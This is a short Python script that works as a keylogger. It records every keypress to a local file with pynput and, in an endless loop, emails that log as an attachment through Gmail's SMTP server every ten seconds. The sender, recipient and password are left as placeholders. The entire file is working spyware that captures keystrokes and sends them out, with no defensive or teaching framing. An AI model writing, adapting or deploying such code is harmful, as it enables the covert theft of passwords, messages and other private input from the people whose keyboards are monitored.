import time

from pynput.keyboard import Key, Listener
import logging


log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    while(True):
        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders
   
        fromaddr = "# sender mail id"
        toaddr = "# destination mail id"
   
    # instance of MIMEMultipart
        msg = MIMEMultipart()
  
    # storing the senders email address  
        msg['From'] = fromaddr
  
    # storing the receivers email address 
        msg['To'] = toaddr
  
    # storing the subject 
        msg['Subject'] = "Subject of the Mail"
  
    # string to store the body of the mail
        body = "Body_of_the_mail"
  
    # attach the body with the msg instance
        msg.attach(MIMEText(body, 'plain'))
  
    # open the file to be sent 
        filename = "keylogs.txt"
        attachment = open("keylogs.txt", "rb")
      
    # instance of MIMEBase and named as p
        p = MIMEBase('application', 'octet-stream')
  
    # To change the payload into encoded form
        p.set_payload((attachment).read())
  
    # encode into base64
        encoders.encode_base64(p)
   
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
  
    # attach the instance 'p' to instance 'msg'
        msg.attach(p)
  
    # creates SMTP session
        s = smtplib.SMTP('smtp.gmail.com', 587)
  
    # start TLS for security
        s.starttls()
  
    # Authentication
        s.login(fromaddr, "# sender mail id password")
  
    # Converts the Multipart msg into a string
        text = msg.as_string()
  
    # sending the mail
        s.sendmail(fromaddr, toaddr, text)

    # terminating the session
        s.quit()

        time.sleep(10)
listener.join()
